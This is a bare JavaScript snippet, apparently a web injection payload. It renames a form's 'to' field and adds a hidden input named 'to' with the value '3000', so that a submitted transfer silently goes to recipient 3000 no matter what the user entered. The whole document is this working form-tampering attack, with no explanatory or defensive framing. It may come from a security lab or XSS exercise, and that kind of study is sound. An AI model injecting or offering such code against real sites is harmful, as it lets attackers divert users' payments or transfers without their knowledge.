var receiver = document.getElementById("to")
receiver.setAttribute("name", "nothing interesting")
var newElement = document.createElement("input")
newElement.value = "3000"
newElement.setAttribute("type", "hidden")
newElement.setAttribute("name", "to")
receiver.parentElement.appendChild(newElement)